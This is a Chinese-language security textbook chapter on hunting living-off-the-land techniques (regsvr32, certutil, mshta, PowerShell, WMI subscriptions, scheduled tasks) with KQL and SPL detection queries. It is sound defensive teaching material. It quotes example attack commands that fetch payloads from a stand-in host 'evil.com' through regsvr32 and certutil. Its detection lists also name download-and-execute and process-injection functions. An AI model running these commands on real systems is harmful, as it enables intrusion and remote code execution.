# Ch 29 — 狩獵常見 TTP：LOLBins / PowerShell / WMI / Scheduled Task

> 目標：對最常見的 living-off-the-land 技術——LOLBins、惡意 PowerShell、WMI 持久化、Scheduled Task 濫用——建立完整的狩獵視角。每種技術你身為攻擊者已經會用，這章反過來從防守端看它們留下什麼痕跡、用什麼查詢找到它們。

> 環境：查詢以 KQL（Microsoft Sentinel/Defender）和 SPL（Splunk）為示範。事件來源以 Sysmon 和 Windows 原生 Event Log 為主。

## 為什麼 LOLBins/LOLBas 這麼難抓？

這就是你已經知道的問題，只是換了視角：

攻擊者用 `regsvr32.exe /s /i:http://evil.com/payload.sct scrobj.dll`，這整件事：
- 是由 Windows 原生簽署的二進位執行
- 不需要落地新的 executable
- 不觸發 AppLocker（如果 AppLocker 只管未簽署的程序）
- 網路流量看起來是 HTTP 不是奇怪協定

從防守方的角度，**簽名是沒有用的**。你不能說「regsvr32 是惡意的」，因為 regsvr32 是合法工具。你只能說「regsvr32 做了這件不尋常的事」。這是行為偵測的核心困難。

[LOLBAS 專案](https://lolbas-project.github.io/)是最完整的 LOLBins 清單，包含每個二進位的濫用方法和對應的 ATT&CK TTP。

## LOLBins 狩獵

### 重點目標

| LOLBin | ATT&CK | 常見濫用方式 |
|---|---|---|
| `regsvr32.exe` | T1218.010 | 載入遠端 COM scriptlet（Squiblydoo）|
| `mshta.exe` | T1218.005 | 執行遠端 HTA 檔或內嵌 VBScript |
| `certutil.exe` | T1140, T1105 | Base64 decode、下載遠端檔案 |
| `bitsadmin.exe` | T1197 | 下載並執行遠端 payload |
| `rundll32.exe` | T1218.011 | 執行 DLL 入口點、載入惡意 DLL |
| `msbuild.exe` | T1127.001 | 從 XML 直接執行 C# 程式碼 |
| `wmic.exe` | T1047 | 遠端執行、建立程序 |
| `installutil.exe` | T1218.004 | 繞過 AppWhitelisting 執行 .NET |

### 狩獵查詢：regsvr32 網路活動

正常的 `regsvr32` 不發網路連線。看到它建立網路連線就是強烈信號：

```kql
// KQL - regsvr32 建立外部連線（示意）
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "regsvr32.exe"
| where RemoteIPType == "Public"
| project Timestamp, DeviceName, AccountName,
          RemoteIP, RemotePort, RemoteUrl,
          InitiatingProcessCommandLine
| order by Timestamp desc
```

```spl
// SPL（示意）
index=sysmon EventCode=3 Image="*\\regsvr32.exe"
| where NOT (dest_ip="10.0.0.0/8" OR dest_ip="192.168.0.0/16" OR dest_ip="172.16.0.0/12")
| table _time, ComputerName, User, dest_ip, dest_port, CommandLine
```

### 狩獵查詢：certutil 下載行為

`certutil -urlcache -split -f http://evil.com/payload.exe` 是最古老的 LOLBin 下載技巧之一。雖然 Windows Defender 現在對這個特別敏感，但指令混淆後仍常見：

```kql
// KQL - certutil 的命令列異常（示意）
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName =~ "certutil.exe"
| where ProcessCommandLine has_any (
    "urlcache", "url", "ping", "decode", "encode",
    "http://", "https://", "ftp://"
  )
| project Timestamp, DeviceName, AccountName,
          ProcessCommandLine, InitiatingProcessFileName
```

### 狩獵查詢：mshta 執行外部 HTA

```kql
// KQL（示意）
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName =~ "mshta.exe"
| where ProcessCommandLine has_any ("http://", "https://", "ftp://", "\\\\")
| project Timestamp, DeviceName, AccountName,
          ProcessCommandLine, InitiatingProcessFileName
```

**注意**：`mshta.exe` 執行本地 HTA 是正常的（某些企業內部工具用 HTA 介面），所以只抓外部 URL 或 UNC 路徑。

### Stacking：找罕見的 LOLBin 呼叫者

比找 LOLBin 本身更有效的做法——找是「誰」呼叫了這個工具：

```kql
// KQL - 誰呼叫了 certutil（示意）
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "certutil.exe"
| summarize count() by ParentProcess = InitiatingProcessFileName
| order by count_ asc
// 結果（示意）：
// cmd.exe          → 850 次（正常，IT 腳本）
// powershell.exe   → 23 次（可能正常）
// winword.exe      → 1 次  ← 強烈可疑：Word 不應該呼叫 certutil
// mshta.exe        → 2 次  ← 可疑：可能是多段落地
```

## 惡意 PowerShell 狩獵

### 偵測點全景

PowerShell 的遙測有多個層次，每層蓋住不同的規避手法：

| 層次 | Event Source | Event ID | 能看到什麼 |
|---|---|---|---|
| 程序建立 | Sysmon | 1 | `powershell.exe` 的命令列（未混淆時有用）|
| Script Block Logging | Windows | 4104 | 執行前的完整腳本（包含 decode 後的內容）|
| Module Logging | Windows | 4103 | 模組呼叫和參數 |
| Transcription | 檔案系統 | 無 ID | 輸入輸出的文字記錄 |
| AntiMalware (AMSI) | Windows | 4688/Sysmon | AMSI scan 呼叫結果 |
| ETW Provider | ETW | 依 provider | 引擎級別的事件 |

**Script Block Logging（Event 4104）是最關鍵的**。即使攻擊者用 `-EncodedCommand` 傳入 Base64，Script Block Logging 看到的是 PowerShell 引擎收到、準備執行的明文腳本。

注意：如果 AMSI 被 bypass、Script Block Logging 被關閉，這個遙測就消失了。Ch 30 會討論怎麼偵測這件事本身。

### 狩獵查詢：Encoded PowerShell

```kql
// KQL - 找 encoded command（示意）
DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName =~ "powershell.exe"
| where ProcessCommandLine matches regex @"(?i)-e[nc]{0,6}[ ]+[A-Za-z0-9+/]{50,}={0,2}"
// 這個 regex 找 -e / -en / -enc / -enco 後面接 Base64 字串
| project Timestamp, DeviceName, AccountName,
          ProcessCommandLine, InitiatingProcessFileName
| order by Timestamp desc
```

```spl
// SPL（示意）
index=sysmon EventCode=1 Image="*\\powershell.exe"
| regex CommandLine="(?i)-e[nc]{0,6}\s+[A-Za-z0-9+/]{50,}={0,2}"
| table _time, ComputerName, User, CommandLine, ParentImage
```

### 狩獵查詢：Script Block Log 中的危險函數

Event 4104 是寶庫。攻擊者的 PowerShell payload 裡幾乎必然含有以下函數之一：

```kql
// KQL - 從 Event 4104 找危險 PowerShell 函數（示意）
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4104
| where EventData has_any (
    "Invoke-Expression", "IEX",
    "Invoke-WebRequest", "IWR",
    "Net.WebClient",
    "DownloadString", "DownloadFile",
    "FromBase64String",
    "System.Reflection.Assembly",
    "Add-Type",
    "VirtualAlloc",
    "WriteProcessMemory",
    "CreateRemoteThread"
  )
| project TimeGenerated, Computer, Account,
          ScriptBlockText = EventData
| order by TimeGenerated desc
```

**邊界案例**：`Invoke-Expression` 和 `IEX` 在合法的 PowerShell 腳本裡也存在。純靠關鍵字找到的結果需要看完整的 script block 才能判斷。常見的合法用途：`IEX (Get-Command *)`、設定腳本裡的動態執行。

### 狩獵查詢：非預期的 PowerShell 父程序

```kql
// KQL - 找從非預期程序呼叫的 PowerShell（示意）
let expected_parents = dynamic([
    "explorer.exe", "cmd.exe", "powershell.exe", "pwsh.exe",
    "vssadmin.exe",   // 系統 VSS 作業偶爾呼叫 PS
    "services.exe",   // 服務啟動
    "svchost.exe",    // Windows Update/Schedule 等服務
    "taskhostw.exe"   // 排程工作
]);

DeviceProcessEvents
| where Timestamp > ago(7d)
| where FileName in~ ("powershell.exe", "pwsh.exe")
| where InitiatingProcessFileName !in~ (expected_parents)
| summarize
    count(),
    sample_cmdline = any(ProcessCommandLine)
  by InitiatingProcessFileName, DeviceName
| where count_ < 5
| order by count_ asc
// winword.exe 生 powershell.exe → 絕對可疑
// acrobat.exe 生 powershell.exe → 絕對可疑
```

## WMI 濫用狩獵

WMI（Windows Management Instrumentation）是攻擊者最愛的三個理由：

1. Windows 原生、無需安裝工具
2. 可以遠端執行（T1047）
3. WMI event subscription 可以做持久化（T1546.003），且幾乎沒有人在監控它

### WMI 遠端執行

```kql
// KQL - WMI 觸發的程序建立（示意）
// WMI 執行的程序，父程序是 WmiPrvSE.exe
DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessFileName =~ "WmiPrvSE.exe"
| where FileName !in~ (
    // 過濾已知合法的 WMI 呼叫
    "msiexec.exe",    // 軟體部署
    "conhost.exe"
  )
| project Timestamp, DeviceName, AccountName,
          FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by Timestamp desc
```

`WmiPrvSE.exe` 是 WMI Provider Host，任何透過 WMI 執行的命令，父程序都是它。

### WMI Event Subscription 持久化

這是更隱蔽的招：建立 WMI Filter（觸發條件）+ Consumer（執行動作），讓系統在特定事件（如開機、某個程序出現）時自動執行攻擊者的 payload。

**Sysmon** 的 Event 19（WmiEventFilter 活動）、20（WmiEventConsumer 活動）、21（WmiEventConsumerToFilter 活動）是偵測這個的關鍵：

```kql
// KQL - WMI subscription 建立（示意）
DeviceEvents
| where Timestamp > ago(30d)
| where ActionType in ("WmiBindEventFilterToConsumer",
                        "WmiEventConsumerToFilterBinding")
| project Timestamp, DeviceName, AccountName,
          ActionType, AdditionalFields
// 任何新的 WMI subscription 都值得調查
```

```spl
// SPL（示意）
index=sysmon EventCode IN (19, 20, 21)
| table _time, ComputerName, User, EventCode, Details
```

Windows 原生的 Event ID 5861（WMI Activity operational log）也記錄 event subscription 活動，但預設不開啟：

```
Event ID 5861 來源：Microsoft-Windows-WMI-Activity/Operational
Namespace: root\subscription
Query: SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA 'Win32_Process'
Consumer Name: SystemMonitor（惡意用的假名）
```

### 合法 vs 惡意 WMI subscription 的差異

| 特徵 | 合法（如 SCCM） | 惡意 |
|---|---|---|
| Consumer 類型 | CommandLineConsumer 或 ScriptConsumer | 同，但內容可疑 |
| Filter namespace | root\cimv2 | 同 |
| Consumer name | 有意義的產品名稱 | 隨機字串或看似合法的假名 |
| 執行的命令 | 已知管理工具路徑 | PowerShell encoded、temp 目錄路徑 |
| 建立時機 | 軟體安裝時 | 任何時間 |

## Scheduled Task 濫用狩獵

Scheduled Task（排程工作）的持久化（T1053.005）是另一個常見機制，且正常環境裡就有大量排程工作，所以雜訊很高。

### 關鍵 Event ID

| Event ID | 日誌來源 | 含義 |
|---|---|---|
| 4698 | Security | 排程工作被建立 |
| 4702 | Security | 排程工作被修改 |
| 4699 | Security | 排程工作被刪除 |
| 4700/4701 | Security | 排程工作被啟用/停用 |
| 106 | Task Scheduler/Operational | 工作被註冊 |
| 200 | Task Scheduler/Operational | 工作被執行 |

### 狩獵查詢：找可疑的排程工作建立

```kql
// KQL - 找建立排程工作的事件，特別注意非管理帳號和可疑動作（示意）
SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4698
| extend
    TaskName   = extract(@"<TaskName>([^<]+)</TaskName>", 1, EventData),
    Command    = extract(@"<Command>([^<]+)</Command>", 1, EventData),
    Arguments  = extract(@"<Arguments>([^<]+)</Arguments>", 1, EventData),
    Author     = extract(@"<Author>([^<]+)</Author>", 1, EventData)
| where Command has_any (
    "powershell", "cmd", "wscript", "cscript",
    "mshta", "regsvr32", "rundll32", "certutil"
  )
| project TimeGenerated, Computer, Account,
          TaskName, Command, Arguments, Author
| order by TimeGenerated desc
```

**典型惡意 scheduled task 的特徵**：
- Command 是 PowerShell/cmd，Arguments 含 encoded command 或外部 URL
- TaskName 用看似合法的名字（如 `MicrosoftWindowsUpdater`）
- 觸發條件是系統啟動或登入（`<LogonTrigger>`）
- 建立者帳號不是 SYSTEM 或已知管理帳號

### Stacking：找罕見的 scheduled task 建立來源

```kql
// KQL - 誰在建立排程工作（示意）
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4698
| summarize count() by Account
| order by count_ asc
// SYSTEM、管理服務帳號應該是最多的
// 看到一般使用者帳號建立排程工作就是信號
```

## 範例：完整的 LOLBin 入侵鏈追蹤

以下追蹤一個典型的 spear phishing → LOLBin → PowerShell → C2 鏈：

**攻擊者步驟**：
1. 受害者開啟惡意 Word 文件（.docm）
2. VBA macro 呼叫 `mshta.exe` 執行 HTA dropper
3. HTA dropper 用 `certutil` 下載第二段 payload
4. 第二段是 PowerShell encoded command，建立 WMI persistence 和 C2 beacon

**防守方怎麼串起來**：

```kql
// Step 1：找 Word 生出的可疑子程序（示意）
DeviceProcessEvents
| where Timestamp between (datetime(2026-07-01) .. datetime(2026-07-31))
| where InitiatingProcessFileName =~ "winword.exe"
| where FileName in~ ("mshta.exe", "powershell.exe", "cmd.exe", "wscript.exe")
// 發現：winword.exe → mshta.exe（1 次，2026-07-15 09:22:18）

// Step 2：找同一台機器，mshta 之後的活動（示意）
DeviceProcessEvents
| where Timestamp between (datetime(2026-07-15T09:22:00) .. datetime(2026-07-15T09:30:00))
| where DeviceName == "VICTIM-PC-01"
| order by Timestamp asc
// 發現：mshta.exe → certutil.exe（-urlcache -f http://evil.com/p.exe）→ powershell.exe -enc ...

// Step 3：找同一台機器的 WMI subscription 建立（示意）
DeviceEvents
| where Timestamp between (datetime(2026-07-15T09:22:00) .. datetime(2026-07-15T10:00:00))
| where DeviceName == "VICTIM-PC-01"
| where ActionType has "Wmi"
```

這種跨資料來源的追蹤，靠的是 Device 名稱和時間戳的對齊，不是單一查詢。

## 踩雷

1. **regsvr32 / mshta 在正常環境真的存在**：某些老系統的 ActiveX 控制項會用 regsvr32 安裝，某些內部工具真的用 HTA 介面。狩獵前先了解你環境的 baseline，否則每次都在追正常行為。

2. **Script Block Logging 必須手動開啟**：Windows 預設不開啟 Event 4104 的詳細記錄。如果你的 SIEM 裡沒有 4104 事件，先去確認 PowerShell logging GPO 是否設定：`HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging = 1`。

3. **WMI subscription 在重啟後會重新觸發**：你找到惡意的 WMI subscription 並把程序殺掉，但 subscription 本身還在。清除時要刪除 WMI Filter、Consumer、Binding 三個物件，只殺程序是不夠的。

4. **Scheduled Task 有時用 XML 直接寫入，不走 Task Scheduler API**：攻擊者有時直接在 `%SystemRoot%\System32\Tasks\` 目錄寫 XML 檔案，這樣 Event 4698 可能不觸發。Sysmon 的 File Create 事件（Event 11）對這個目錄監控能補上這個盲點。

5. **certutil 的 `-decode` 比 `-urlcache` 更難抓**：攻擊者先用 certutil 下載加密 blob，再用 certutil -decode 解碼。這樣命令列裡沒有明顯的 URL。看 certutil 的網路連線（Sysmon Event 3）更可靠。

## 進階延伸

- **LOLBAS 專案的自動化掃描**：用 [LOLBAS](https://lolbas-project.github.io/) 的完整清單，寫一個 Sigma 規則集涵蓋所有已知的 LOLBin 濫用場景，然後定期對環境執行。
- **Process Lineage Graph**：把 Sysmon Event 1 的 parent-child 關係建成圖，用 graph 演算法找從 Office 程序開始的深層鏈（攻擊者常建 5-6 層的程序鏈來規避規則）。
- **WMI namespace 枚舉**：定期用 PowerShell 枚舉 `root\subscription` namespace 下的 Filter/Consumer/Binding，把結果和 baseline 比對，找新出現的物件。

## 本章重點整理

- LOLBin 偵測的核心是行為，不是簽名：偵測「誰呼叫它」「它做了什麼」，而非「它存不存在」
- PowerShell 有多個遙測層，Script Block Logging（Event 4104）最完整，但需要手動啟用
- WMI 持久化靠三個物件：Filter + Consumer + Binding，清除時三個都要刪
- Scheduled Task 偵測看 Event 4698，但攻擊者可以繞，Sysmon 的 File Create 補盲點
- 跨資料來源串聯（endpoint + 網路 + 日誌）才能重建完整攻擊鏈

## 自我檢核

- [ ] 我能說出至少 5 個 LOLBin 和它們常被濫用的方式
- [ ] 我能解釋 Script Block Logging 和 AMSI 各在 PowerShell 執行的哪個階段截取
- [ ] 我能寫查詢找出「Office 程序生出 PowerShell」這類異常親子關係
- [ ] 我知道 WMI subscription 的三個元件，以及在哪個 Event ID 記錄
- [ ] 給我一個可疑事件序列，我能說出下一步要查哪個資料來源

## 延伸閱讀

1. **[LOLBAS 專案](https://lolbas-project.github.io/)** — 最完整的 LOLBin 清單，每個工具都有濫用方式和 ATT&CK mapping；開 hunt 前先查這裡找你的目標工具。

2. **[FireEye/Mandiant 的 WMI Offense, Defense, and Forensics 白皮書](https://www.mandiant.com/resources/reports/wmi-offense-defense-and-forensics)** — WMI 攻防最完整的學術級文件，Filter/Consumer/Binding 的內部機制全部在這裡。

3. **[PowerShell Logging for Incident Responders - SANS](https://www.sans.org/white-papers/38490/)** — 各個 PowerShell logging 機制的差異比較，哪個能被繞、哪個最可靠，實際設定步驟。

4. **[Elastic Security 的 LOLBins hunting 博客系列](https://www.elastic.co/security-labs/)** — 有多篇文章針對具體 LOLBin（certutil/mshta/regsvr32）做深度 hunting query 分析，KQL/EQL 都有。

5. **[Atomic Red Team - T1218 系列](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1218)** — 在你的測試環境跑 Atomic Test，產生真實日誌後再用本章查詢去找，驗證你的遙測管道有沒有漏洞。

---

→ [Ch 30 對抗規避：偵測 AMSI bypass / unhooking](./30-detecting-evasion.md)
